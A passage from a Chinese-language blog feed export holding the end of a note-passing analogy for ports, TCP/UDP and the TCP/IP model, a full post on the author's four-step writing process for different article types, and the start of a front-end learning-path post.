src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__pv__HH4wigZriPfUwBLz0aw.png"></p><p>這樣子用數字來表示就好，方便很多，大家只要有這個表格就可以來做對照。當八班的同學收到這張紙條以後，就會根據上面的服務轉給負責處理的那一位同學。</p><p>而接下來又碰到一個問題，就是格式。千千當初是以訂便當為基礎，才有了現在看到的格式，例如說狀態代碼、動詞以及 header、body 等等的設置。</p><p>可是有些服務根本用不到這些啊！</p><p>例如說「幫忙借籃球」服務，就只需要知道幾顆就好，不會有修改或是取消的事情發生，根本不需要這麼複雜的格式。</p><p>於是借籃球服務就有了自己獨特的格式，只要寫一兩個字就好：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__U6cLNrRTGXB6bKJ__pOSTUQ.png"></p><p>再來呢，原本的傳紙條也都是建立在《紙條保證傳得到通訊協定》之上，每次傳之前都要先經過三次的確認。但有些同學發現「NBA 即時戰況」這個服務並不需要這件事，因為每隔三秒鐘，就會寫一張新的紙條到指定的班級去。</p><p>就算中間漏掉兩張紙條，也只損失了六秒鐘的戰況而已，這時間可能比數完全沒有變動！再者，如果少掉了前面三次確認這個前置作業，傳紙條的速度就可以更快，可以更即時地提供戰況訊息。</p><p>於是，他們後來就決定不讓 NBA 即時戰況這個服務遵守《紙條保證傳得到通訊協定》，因為根本沒有必要。在這個服務上，不遵守這個協定可以得到更多的好處。</p><p>就這樣，千千他們班開發出來的服務愈來愈多元，全校三個年級的學生都是他們的客戶，實現了千千一開始的願景：全班一起發大財。</p><p>至於之後千千碰到競爭對手惡意竄改紙條，就是另外一個故事了。</p><h4 id="第三集所對應到的網路概念"><a href="#第三集所對應到的網路概念" class="headerlink" title="第三集所對應到的網路概念"></a>第三集所對應到的網路概念</h4><p>這一集裡面我們多了許多不同的服務，也產生了對應的服務代碼，這些對應到網路世界裡就是 Port（連線埠，中國翻叫端口）的概念，一台主機上面可以跑很多不同的服務，但你要怎麼區別呢？就是利用 Port（服務代碼）。</p><p>就像千千班上一樣，有訂便當、訂飲料還有借籃球，要把紙條傳到「八班：3000」才是訂飲料這個服務。網路也是如此，一台主機上有很多服務，你一定要傳到「Server IP：80」才是 HTTP 伺服器這個服務。</p><p>每一種服務都有預設的 Port，例如說 HTTP 是 80，FTP（<a href="https://de.wikipedia.org/wiki/File_Transfer_Protocol">File Transfer Protocol</a>）是 21，所以你會發現在使用瀏覽器的時候沒有輸入 Port，因為預設就是 80，所以不用特別填寫。</p><p>這可以對應到我們之前的圖表，在最上面一層「實際應用」，可以有不同的應用，例如說訂便當跟訂飲料。網路世界的話則是 HTTP 跟 FTP 這兩個不同的通訊協定。</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1____Y2TypSG10zNlltT3__dxEg.png"></p><p>除此之外，第二集裡面我們以訂便當做基礎，發展出了一堆格式，而這些格式其實都只是為了更方便訂便當，對其他的服務不一定適用。</p><p>舉例來說，「借籃球」就不適用，而且還造成反效果，增添了複雜度。或是故事中的 NBA 即時戰況也一樣，甚至連第一集尾聲的《紙條保證傳得到通訊協定》都不適用，因為漏掉訊息根本沒差，更重要的是傳輸的即時性。</p><p>這邊對應到網路的話，就是說不同服務可以有不同的內容格式，不一定都要遵照同一個。而 NBA 即時戰況那個案例告訴我們說，可以不遵守《紙條保證傳得到通訊協定》。</p><p>在傳輸資料的時候有很多種協定可以選擇， TCP 是一種，就是我們故事中的《紙條保證傳得到通訊協定》，還有另外一種叫做 UDP（User Datagram Protocol），就是上面提到的「漏掉訊息沒差，重要的是傳輸即時性」的通訊協定。</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__Z7v4uPI663Gyk__DKOxvxZA.png"></p><p>在「如何傳送資料」這一層裡面，有可以保障收發正常的 TCP，也有不能保障但是效能較好的 UDP，而上層的實際應用可以選擇任何一種。</p><p>這邊的圖可能有點小誤導所以要特別說明，圖片並不是說 FTP 建立在 UDP 之上，只是想表達應用這一層有 HTTP 「與」 FTP，傳輸這層有 TCP「與」UDP，而 HTTP 與 FTP 事實上都選擇了以 TCP 作為傳輸方式。</p><p>舉例來說，HTTP 就像訂便當一樣，為了保證訊息收發正常，就選擇了 TCP（不過最新的 HTTP&#x2F;3 又是另一個故事了，這個先跳過）；而通常那種即時通話或是視訊的通訊協定都會選擇 UDP，因為少掉幾個封包根本沒有差，比較重要的是傳輸的速度，就像 NBA 即時戰況一樣。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>在上面連續三集的故事裡面，我們透過傳紙條這個實際案例，去想像會碰到的困難以及解決方法，每一種優化方法都其來有自，絕對不是憑空產生的。</p><p>而傳紙條的這個模型，其實就是俗稱的 TCP&#x2F;IP 四層模型：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__BFde4y9sPtLllTZ6OjoKEg.png"></p><p>這個模型會把網路分成四層，每一層都關注不同的面向，例如說傳輸層指的就是「你要以什麼方式來傳送資料？」，而應用層是最貼近我們的一層，就是實際應用。這四層關注的對象也可以透過傳紙條的例子來看，會清楚很多。</p><p>對我來說，與其去思考「為什麼會有 HTTP？」、「為什麼要這樣分層？」，不如先從傳紙條的例子開始慢慢去想，去想說當服務變大的時候該怎麼辦，當格式不統一的時候該做些什麼，這時候就會發現這些問題的解答，就是 Protocol 出現的原因。</p><p>傳紙條的故事可以直接對應到網路相關的例子，而這樣子的對應我認為很能幫助大家對於網路相關知識的理解。</p><p>希望這一篇對大家有幫助，能夠更理解 TCP&#x2F;IP 以及 HTTP 這些通訊協定。</p><p>這篇的文章內容其實最早出自線上課程：<a href="https://www.lidemy.com/p/net101-js">[NET101] 網路基礎概論（搭配 JS 實作練習）</a>的前幾個單元，有興趣的可以去看一下。不過課程中最精彩的部分就在這篇文章裡了，而且是修正過的版本，內容要比影片再豐富一點。</p><p>備註：有關於三次握手，其實不是為了確保雙方都能夠收發，更詳細的解釋可以參考：<a href="https://draveness.me/whys-the-design-tcp-three-way-handshake">为什么 TCP 建立连接需要三次握手 · Why’s THE Design?</a></p><p>想持續關注的話可以 follow 一下，單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/?source=post_page---------------------------">Lidemy 粉絲專頁</a>。想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium?source=post_page---------------------------">https://aszx87410.github.io/blog/medium</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我是如何完成一篇文章的？</title>
      <link href="/2019/08/23/how-do-i-write-965328ae91fe/"/>
      <url>/2019/08/23/how-do-i-write-965328ae91fe/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/how-do-i-write-965328ae91fe/0____9QUTA89dOWF3wsE.jpg"></p><p>我也忘記這個主題是我自己想寫，還是有人問我所以才寫的。但無論如何這主題都滿有趣的，而且算是拋磚引玉，因為我也很好奇其他人寫文章時背後的過程以及心路歷程，希望大家可以互相分享交流。</p><p>原本這篇文章其實已經寫好一半，是把背後過程分成四個階段：記錄靈感、找資料、醞釀跟動手寫作。但我後來發現依照文章種類的不同，背後的過程以及細節都不太一樣，因此後來砍掉重練，改成以不同類別的角度來切入，並且以之前寫過的文章當做例子。</p><p>我自己會寫的文章類別大概分成三種：</p><ol><li>面向一般大眾的技術白話文</li><li>面向工程師的硬實力技術文</li><li>心得文</li></ol><p>每個類別我都找了一些文章，以下將直接以這些文章做舉例。</p><h3 id="面向一般大眾的技術白話文"><a href="#面向一般大眾的技術白話文" class="headerlink" title="面向一般大眾的技術白話文"></a>面向一般大眾的技術白話文</h3><h4 id="範例文章"><a href="#範例文章" class="headerlink" title="範例文章"></a>範例文章</h4><ol><li><a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a></li><li><a href="/2019/06/20/ramen-and-api-6238437dc544/">從拉麵店的販賣機理解什麼是 API</a></li><li><a href="/2018/06/10/frontend-engineer-guide-297821512f4e/">零基礎的小明要如何成為前端工程師？</a></li></ol><p>我從以前就一直很喜歡用白話文解釋艱澀技術名詞的這種風格，例如說 PTT 的<a href="https://disp.cc/b/163-4QHS">水精靈</a>就是我的偶像之一，以前高中時也買過那種靠著有趣的故事理解歷史的書籍，例如說<a href="https://www.books.com.tw/products/0010497392">《歷史是個什麼玩意兒，袁騰飛說中國史》</a>，或前陣子買的《<a href="https://www.books.com.tw/products/0010722013">臺灣史上最有梗的臺灣史</a>》。</p><p>我打從心底相信一件事情，那就是<strong>大部分的東西</strong>都可以用輕鬆好懂的白話文來解釋。如果解釋不了，那一定是你講得不夠白話，而不是這主題本身太過於艱澀。既然好好講話就可以讓對方理解，幹嘛一定要搬出一大堆技術名詞來嚇別人？何況目標讀者還是那些沒有技術背景的一般人。</p><p>我不太喜歡的一種風格就是在對一般人講解技術名詞時，只會像字典那樣帶過去：「這個叫做 Single Page Application，簡稱 SPA，單頁式應用，例如說 Gmail ，因為只有一頁而已」、「這個是 Cookie，就是儲存在瀏覽器的資料」…，這樣的學習成果極差。</p><p>除了白話以外，還有另一個重點是脈絡。</p><p>若是你想要講的白話，就要把技術放在一個脈絡底下去談它，這樣讀者才能知道為什麼需要這個技術，並且理解技術出現當下的時空背景是什麼。</p><p>我覺得自己會這麼注重這點，跟以前高中時很喜歡歷史有極大的關係。我忘記是從什麼時候對歷史開竅的了（搞不好就是看了那些白話文書籍之後），但開竅以後就覺得歷史的主軸是脈絡，而不是年代以及事件。</p><p>很多人會以為歷史就是一門需要去記年代以及事件的科目，但我不這麼認為。歷史就是以前發生過的事情，說穿了就是許多故事。大部分人都喜歡聽故事，但在唸歷史時卻忘記了它其實是一段故事。</p><p>重點不是那些事件本身，而是為什麼會有這些事件發生？是什麼引起的？當時的局勢是什麼樣子？那些點只是歷史這條長線之中很小的一部分，若你只看得到點，就永遠看不到背後其實是一條線。</p><p>我高中的歷史啟蒙之一是 PTT 歷史版的《<a href="https://www.ptt.cc/bbs/historia/M.1262975264.A.E21.html">海之民建立的千年共和國：威尼斯戰史</a>》系列文，寫得真是好看而且引人入勝，把故事講得很精彩，比教科書有趣一百倍，在這邊誠心跟大家推薦。</p><p>總之有了脈絡這個心法之後，自然而然就會想把這樣的東西放到我的白話技術文裡面去——因為很多時候它是理解的關鍵。</p><p>舉例來說，大家都知道 Cookie 是瀏覽器存的一小塊資訊。但你有沒有想過 Cookie 發明以前是什麼樣子？為什麼要有 Cookie？Cookie 發明後帶來什麼樣的改變？我覺得這些問題才是重要的，因為只有理解這些，你才能真正理解 Cookie 到底是幹嘛的。</p><p>以上大概解釋了一下我為什麼喜歡寫白話文以及脈絡的重要性，接著來談談我是怎麼樣產生靈感的。</p><h4 id="第一步：尋找靈感"><a href="#第一步：尋找靈感" class="headerlink" title="第一步：尋找靈感"></a>第一步：尋找靈感</h4><p>靈感通常不會突然飛來，而是發生了什麼事所以給了你靈感。</p><p>我的靈感來源有兩個，工作與教學。</p><p>工作上會碰到一些技術問題，有時候可能只是基本的問題，你以為你理解，但實際深入之後卻發現不是這麼一回事，其實你不太懂這項技術。這時候就會想說：好，那我以後來研究一下這個技術好了，這就變成了靈感。</p><p>教學上的靈感來源是因為樣本數比較大（30~50 人），當你發現了集體卡關的現象時，就知道那邊一定有問題。例如說學生可能很多人卡在 API 的觀念，去找了很多資料還是不懂什麼是 API，這就是你表現的時候了，就可以來寫一篇有關 API 的白話科普文。</p><p>所以《<a href="/2019/06/20/ramen-and-api-6238437dc544/">從拉麵店的販賣機理解什麼是 API</a>》其實就是這樣來的。</p><h4 id="第二步：蒐集資料"><a href="#第二步：蒐集資料" class="headerlink" title="第二步：蒐集資料"></a>第二步：蒐集資料</h4><p>決定好主題以後就要來開始找資料，在這個階段深度比廣度重要。以 Session 跟 Cookie 為例，一定可以找到一大堆相關的文章，但我敢保證八成的文章都長得差不多。大概就是簡單介紹一下這兩個東西，然後介紹 Cookie 可以放哪些參數，最後頂多加個實際應用範例，就結束了。</p><p>我自己覺得很多文章的深度都是不夠深的，有深度的文章可遇不可求。</p><p>所以我會盡量去找一些有權威性的資料來看，以網頁前端的領域來說就是 RFC、W3C 或是 ECMAScript 規格之類的，看你想寫的主題是什麼，這些東西的深度一定最深。</p><p>在寫《<a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a>》這一系列的時候，我大概花了三天看了三份 RFC 還有一篇像是論文的東西，就是為了想要徹底理解 Cookie 的歷史。</p><p>總之，這個階段的目標有兩個。</p><p>第一個是看一下其他人都寫了什麼，以什麼角度來切入，同時也增進自己對這個主題的理解。第二個目標是在下筆前確定自己對這個主題的理解是正確的。雖然之後還是有可能被糾錯，但至少有盡過查證的義務。</p><p>再來就可以邁入時間最長的第三階段。</p><h4 id="第三步：醞釀"><a href="#第三步：醞釀" class="headerlink" title="第三步：醞釀"></a>第三步：醞釀</h4><p>主題決定完也確定自己的理解無誤了，再來就是要想想自己要怎麼寫，要用什麼角度來切入這個主題。這一步跟上一步是相輔相成的，邊查資料邊想，邊想也邊查資料。</p><p>同樣的主題可以有千百種不同的寫法，也有許多種方式可以用來舉例。有時候比起常見的例子，我會想要舉一個不太一樣卻也貼切的，才能有驚喜感。</p><p>例如說我在《<a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a>》裡面舉的雜貨店加上臉盲症（？）的例子，就跟常見的通行證或是飲料店例子不太一樣，雖然故事誇張了點，但反而更幫助記憶，因為太離奇了所以比較有記憶點。</p><p>這一步會花最久的時間，因為你必須等待。你要讓它自然產生而不是去逼迫它，所以才叫醞釀。心裡有了一個點子，然後放著，偶爾沒事做的時候就想一下大概要怎麼寫，要怎麼開頭怎麼結尾，中間要用什麼故事來舉例，會有哪些情節。</p><p>以我的文章來說，通常架構都是長這樣的：</p><ol><li>開頭稍微講一下為什麼寫這篇</li><li>從原初狀態開始講起，那時候還沒有主角技術 Y</li><li>鋪陳一段，繼續講早期的事</li><li>寫說碰到了什麼問題，把問題講清楚</li><li>開始寫各種當時的解法</li><li>寫解法之一的技術 Y 如何解決問題以及跟其他解法的差別</li><li>寫技術 Y 勝出的理由，再重新介紹一次技術 Y</li><li>附上結語與參考資料，結束</li></ol><p>整體下來是很有脈絡的，可以看成就是少年漫畫主角的一生。世界大亂、主角崛起、打敗敵人、英勇退場。</p><p>平均醞釀的時間大概兩三週左右，像是 Session 與 Cookie 那篇文我花了兩個禮拜來醞釀。</p><h4 id="第四步：寫作"><a href="#第四步：寫作" class="headerlink" title="第四步：寫作"></a>第四步：寫作</h4><p>如果上一步做得夠紮實，有把整個文章的架構都先想清楚的話，這一步就不太需要什麼思考的時間，順著架構把字打出來就好。花的時間取決於你腦袋轉動的速度以及打字速度，以我來說的話有些長文可能會花到一兩天，比較短的半天或一天就可以結束了。</p><p>若是寫一寫突然寫不出東西來，絕對不要在那邊死撐著。趕快打開 YouTube 看一些廢片壓壓驚，或是開始滑個臉書哀居批踢踢，把自己的大腦切換成發散模式，靈感就會自己慢慢累積起來，等到有靈感的時候再繼續寫。</p><h3 id="面向工程師的硬實力技術文"><a href="#面向工程師的硬實力技術文" class="headerlink" title="面向工程師的硬實力技術文"></a>面向工程師的硬實力技術文</h3><h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h4><ol><li><a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a></li><li><a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a></li><li><a href="https://github.com/aszx87410/blog/issues/30">深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？</a></li></ol><p>技術文章比較常見的就兩種，一種是教學文，另一種是對於某種主題的研究。而我的文章幾乎都是後面的類型，因為教學我都錄成影片了，所以不會想要再寫文章講類似的事。</p><p>我覺得這種針對特定主題的文章有個很重要的點是深度。因為是主打硬實力的文章，所以能挖多深就多深。這邊我一開始也很不習慣，總是覺得自己的實力還沒到，一看到程式碼就退縮了，想說「算了…我也看不懂，就寫到這好了」，或是看到 RFC 文件就想說「阿…好長啊…我英文好差」，就放棄了。</p><p>直到我寫了《<a href="https://github.com/aszx87410/blog/issues/17">我遇過的最難的 Cookie 問題</a>》，鼓起勇氣去看了 Chromium 的原始碼，才發現看原始碼沒有想像中的困難，只要掌握了一點小技巧就可以了，而且在原始碼中找到答案時也會非常開心，並且能夠百分之百保證那是對的。</p><p>上面差不多解釋了我對硬實力技術文章的看法，底下一樣來分享寫一篇文章的過程。</p><h4 id="第一步：尋找靈感-1"><a href="#第一步：尋找靈感-1" class="headerlink" title="第一步：尋找靈感"></a>第一步：尋找靈感</h4><p>這邊的靈感一半來自於工作上，另一半來自於生活上看到的技術文章或是別人問的問題。</p><p>以《<a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a>》為例，是之前幫忙做一個教學相關的專案時，對方誤以為 Session ID 這個東西跟登入的帳號有關，例如說把帳號 hash 過後就變成 Session ID。</p><p>我就跟他說不是的，Session ID 是亂數產生的。但在講出這句話的同時，我發現我沒有證據。我會知道這件事是因為「我以為」或是「我覺得」，但如果有人真的反問我：「你怎麼知道？」，我回答不出來。</p><p>於是我就跑去找 Rails 的原始碼來佐證這件事情，證明說：「你看，真的是亂數產生的，程式碼在這」。</p><p>《<a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a>》這篇則是一如往常在看前端技術社團的時候，發現有人在留言提到 TDZ（Temporal Dead Zone）這個詞。</p><p>我那時就想說：「咦？這是什麼？」，Google 之後才發現是跟 Hoisting 有關的名詞，查到之後覺得滿慚愧的，自以為知道什麼是 Hoisting 可是卻連 TDZ 都沒聽過。因此就循線找了更多文章，查到了更多的資料，最後才把這篇寫出來。</p><h4 id="第二步：蒐集資料-1"><a href="#第二步：蒐集資料-1" class="headerlink" title="第二步：蒐集資料"></a>第二步：蒐集資料</h4><p>這邊其實跟寫白話科普文的時候一樣，都是要盡量去找一些有深度的資料，確保自己的理解沒有問題。雖然說深度比廣度重要，但還是要盡可能找多一點參考資料來看，因為有些文章雖然講的淺，但卻是從一個不同的角度出發，也能讓你獲益良多。</p><p>以《<a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a>》為例，我看了這麼多的資料，裡面有深有淺：</p><p><img src="/img/how-do-i-write-965328ae91fe/1__bm7ACBfvWKlF7jSnkZ2gLQ.png"></p><p>這個步驟會需要去找以及去看很多資料，會花不少時間。以上面的文章為例子，前置作業可能花了一兩週吧，要把上面每一篇都看過，確認自己有徹底理解這個主題。</p><p>除了文章以外，很多時候也必須去看原始碼，才能找到自己想要的答案。例如說 Session 實作那一篇，就需要去看原始碼才寫得出來。</p><p>在看原始碼時有個小技巧，就是善用搜尋。例如說你想在 Rails 裡面找 Cookie 相關實作，就可以在 GitHub 上面針對這個 repo 搜尋「Cookie」，通常就能夠快速定位到相關檔案。找到相關檔案之後其他的都可以不用看了，因為你想找的東西就在附近了。</p><p>再來，追到原始碼的好處是你能肯定這個論述是對的。</p><p>舉例來說，你可能會查到一些資料跟你說在 Chromium 裡面 Cookie 的最大值是 4096 bytes，可是你要怎麼確定這是對的？</p><p>兩個方法，一個是找官方文件佐證，一個是去看相關原始碼。這兩種絕對是最權威性、最能拿來當作證據的資料。</p><h4 id="第三步：醞釀-1"><a href="#第三步：醞釀-1" class="headerlink" title="第三步：醞釀"></a>第三步：醞釀</h4><p>寫真材實料的技術文章一樣需要醞釀，因為你必須決定用什麼角度去寫這篇文章。你要如何開頭，如何結尾，中間要講到哪些東西？</p><p>以《<a href="https://github.com/aszx87410/blog/issues/17">我遇過的最難的 Cookie 問題</a>》為例，開頭我先帶大家認識我之前碰到的問題，再記錄之後研究這個問題的經歷，最後給出一個結論。所以整體也是很有故事性的，發現問題、研究問題、解決問題。</p><p>至於《<a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a>》，開頭就列了十個項目，以這十個項目為主題來展開整篇文章。雖然說是由淺入深，但沒什麼故事性，就只是把這個主題從頭開始講到尾而已。</p><p>那像是《<a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a>》就更不一樣了，更無聊一點。沒有什麼故事性也沒有由淺入深，是三個平行的主題，湊在一起是因為他們都有 Session 與 Cookie 相關的實作。</p><p>所以同一個主題，可以從不同角度去切入。以《<a href="https://github.com/aszx87410/blog/issues/30">深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？</a>》為例，若是想寫這個主題，常見的架構如下：</p><ol><li>介紹什麼是 call by value</li><li>介紹什麼是 call by reference</li><li>介紹什麼是 call by sharing</li><li>介紹以上三種的異同</li><li>結束</li></ol><p>但我自己不太喜歡寫這種架構，我覺得比較無聊一點。我比較喜歡的角度是帶著讀者走過一遍當初研究的歷程。所以我這篇的架構是這樣的：</p><ol><li>講說寫這篇的理由</li><li>稍微介紹 call by value、reference 跟 sharing</li><li>發現有人講「JavaScript 只有 call by value」，試著理解這句話</li><li>碰到問題想不通，決定去找解釋</li><li>找了 ECMAScript 發現一無所獲</li><li>想到隔壁棚的 Java，看看 Java 社群怎麼說</li><li>想到 C++，從 C++ 找靈感</li><li>得到解答，順利結案</li><li>後記</li><li>結束</li></ol><p>這篇我可以不要把歷程寫出來，直接把最後得到的答案寫出來就好，但這樣太無趣了。在<a href="https://www.books.com.tw/products/0010807825">《學生為什麼不喜歡上學</a>》這本書裡有一段我很喜歡：</p><blockquote><p><em>回到教學上，我是這麼想的：我要學生學習的內容，說白了就是一個問題的答案。答案本身一點都不有趣，但如果你知道問題的話，答案可能會很有意思。所以把問題說清楚才那麼重要。但我有時候覺得，身為教師，我們都太強調求出答案，而沒有花足夠的時間讓學生理解問題，並了解問題的重要性。</em></p></blockquote><p>有時候我不想讓讀者直接答案，我想藉著文章跟讀者一起找答案。或者是說，帶領讀者進入我當時找答案的歷程之中。</p><p>醞釀這個階段一樣是以週為單位來算的，我有一個筆記專門在放以後要寫的主題，都會先放個一陣子才真正動筆開始寫，因為有太多東西需要思考了：</p><p><img src="/img/how-do-i-write-965328ae91fe/1__hPhDLztAIhCBdMmsDE8Rsg.png"></p><h4 id="第四步：寫作-1"><a href="#第四步：寫作-1" class="headerlink" title="第四步：寫作"></a>第四步：寫作</h4><p>跟之前一樣，在醞釀階段要先把大綱跟架構先想好，這樣子在實際寫作的時候可以省很多時間。</p><p>有些時候可能沒有想得很清楚就開始寫，下場有兩個，第一個就是邊寫然後腦袋邊運作，寫著寫著就把沒有想清楚的東西補齊了。</p><p>第二個下場就是寫一寫發現寫不下去，連自己都不會想看自己的文章，字寫得出來但毫無靈魂，只是一些冗言贅字而已，只好砍掉重練，再想清楚一點。</p><h3 id="心得文"><a href="#心得文" class="headerlink" title="心得文"></a>心得文</h3><h4 id="範例-1"><a href="#範例-1" class="headerlink" title="範例"></a>範例</h4><ol><li><a href="/2017/10/21/delivery-services-2d90ec1e3555/">四款訂餐外送 App 不專業評測</a></li><li><a href="/2018/10/14/singapore-expense-6f5caaf6dd75/">撇除娛樂不談，在新加坡生活一個月要多少錢？</a></li><li><a href="/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/">非典型微 JGC 修行（JMB 水晶卡）之旅</a></li></ol><p>相較於前兩種分類，心得文比較平易近人一點，都是一些比較生活化的文章。</p><p>因為很生活化，所以寫的時候不用有任何包袱，想寫什麼就寫什麼。</p><h4 id="第一步：尋找靈感-2"><a href="#第一步：尋找靈感-2" class="headerlink" title="第一步：尋找靈感"></a>第一步：尋找靈感</h4><p>這個分類的靈感通常都來自於生活，例如說你做了某件事之後有了一些心得，所以想把這些心得分享給大家。或也有可能初衷不是為了分享，而是為了幫自己留下紀錄，這樣子也很好。</p><p>以《<a href="/2018/10/14/singapore-expense-6f5caaf6dd75/">撇除娛樂不談，在新加坡生活一個月要多少錢？</a>》為例，其實想寫這一篇很久了，因為我那時能找到的新加坡生活相關文章我覺得參考價值都不大，所以想寫一篇以自己當作實際案例的文章，附上一些我覺得有參考價值的資料。</p><p>而《<a href="/2017/10/21/delivery-services-2d90ec1e3555/">四款訂餐外送 App 不專業評測</a>》則是因為那時在新加坡實在是叫太多外送了，每一款訂餐 App 都使用過。在使用的時候你就會發現有些 App 真的難用，但也有些細節做得很好，就特別想跟普羅大眾分享這些小發現。</p><p>我認為心得文是最容易發想靈感的一個類別——如果你本來是個喜歡分享的人的話。因為可以分享的主題太多了，例如說：</p><ol><li>面試準備心得</li><li>面試公司心得</li><li>加入公司滿一個月心得</li><li>工作一年心得</li><li>記帳 App 心得分享</li><li>YouTuber 觀察報告分享</li><li>常用網站分享</li><li>….</li></ol><h4 id="第二步：紀錄"><a href="#第二步：紀錄" class="headerlink" title="第二步：紀錄"></a>第二步：紀錄</h4><p>心得文需要的不是蒐集資料，而是紀錄。</p><p>例如說新加坡生活的那篇文，在寫作之前我必須每天使用記帳 App 記帳 30 天，才有一個月的生活消費記錄。訂餐 App 那篇我也必須針對每個 App 截圖，還要計算各家叫外送的次數，把這些都記錄起來。</p><p>這個階段其實就是為了下一個步驟做準備，把你之後文章需要用到的資料都先記錄起來，截圖也先截好，參考資料都準備好，接著就可以進入到最後一個步驟了。</p><h4 id="第三步：醞釀-2"><a href="#第三步：醞釀-2" class="headerlink" title="第三步：醞釀"></a>第三步：醞釀</h4><p>雖然說心得文比較簡單一點，但還是需要一定的時間來醞釀，因為你依然要想說從哪個角度來切入主題。</p><p>舉例來說，新加坡生活的文章我可以只談總消費，也可以只談吃的價格，也可以從食衣住行育樂六個不同的角度下去分享。外送分享的我也可以單純只講我用每個 App 的心得，但也可以針對不同面向（速度、UI&#x2F;UX、遲到率、客服）去切入，還可以幫每個項目都評分然後比較。</p><h4 id="第四步：寫作-2"><a href="#第四步：寫作-2" class="headerlink" title="第四步：寫作"></a>第四步：寫作</h4><p>跟之前都一樣，我就不特別解釋了。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>四個步驟裡面，最簡單的我覺得是第四步寫作，最困難的是第三步醞釀。</p><p>我會認為寫作最輕鬆，是因為在醞釀的時候已經把文章的架構都想好了，所以當我在寫文章時不用特地去思考要寫什麼，很順的就可以把文章批哩啪拉打完。就算不順，也是稍作休息之後就可以接著繼續完成。</p><p>也因為這樣，醞釀的時間就需要比較久一點，有些主題會放個一兩個月甚至半年的也有，無聊的時候就想一下要朝什麼方向切入、要寫哪些內容，然後記在筆記上面。筆記真的很重要，千萬不要相信你的大腦，大腦會忘記，但筆記不會。</p><p>在我寫完一篇文章之後，通常會再看個兩三遍修改錯字，架構不太會變動，也不太會刪改。白話技術文有些會拿給朋友或學生看，看完之後根據意見再來修改，例如說把例子講得更清楚一點等等，有人幫你看文章還是一件很不錯的事。</p><p>若是有什麼想知道的事但我沒有寫出來的，也歡迎在底下留言，感謝。</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>紮實的網頁前端學習路線與資源推薦</title>
      <link href="/2019/08/20/front-end-learning-path-55201571ecfe/"/>
      <url>/2019/08/20/front-end-learning-path-55201571ecfe/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/front-end-learning-path-55201571ecfe/0__OxXsjpIAo3w32c4c.jpg"></p><p>雖然說我一直很清楚自己目前偏好的學習方法以及路線，並且把我認為適合的路徑都變成<a href="https://github.com/Lidemy/mentor-program-3rd">上課的大綱</a>拿去教學，但一來好像沒多少人會去看那個大綱，二來大綱並沒有詳細解釋背後的原因。因此我才覺得自己有必要寫這一篇，來寫一下自己認為比較「紮實」的網頁前端學習路線。</p><p>在開始之前有幾點必須先說明一下。</p><p>首先，此文章我預設的對象是毫無程式基礎的人。若你已經有了程式基礎，可以自行略過相關的單元。另外，對於毫無基礎又想轉職的人來說，這篇絕對不是「最快」轉職指南。</p><p>求快的話我相信文章裡提到的東西很多都不用學，畢竟現在有些工作的門檻低到我自己都嚇到了。但一心求快只會讓不穩的基礎更不穩。就算找到工作了，可是然後呢？就不再加強自己了嗎？就讓自己的實力停留在那邊嗎？</p><p>若你想把這份工作做得長久，總有一天要面臨這些問題，那些以前沒學好的基礎，會在將來你困惑為什麼上不去時反噬你。每個人認為的「必備」以及對「紮實」的定義都不一樣，例如說有人會覺得只要把資工系教的那些科目修完就叫做紮實，其他都沒那麼重要。而這篇寫的是我自己認為紮實的路線。</p><p>這篇文章會告訴你「我認為」應該要學什麼，以及應該要照怎樣的順序學。最重要的是，我會附上理由。你可以自行判斷背後的理由是否合理，來決定是否要按照這個順序學。理由才是最重要的。</p><p>如果有時間，可以先參考這兩篇我以前寫過的文章：</p><ol><li><a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的到底是什麼？</a></li><li><a href="/2018/11/22/there-is-no-magic-in-my-classroom-4926b67c06f5/">There is no magic in my classroom</a></li></ol><p>底下的學習路線基本上是從我之前的<a 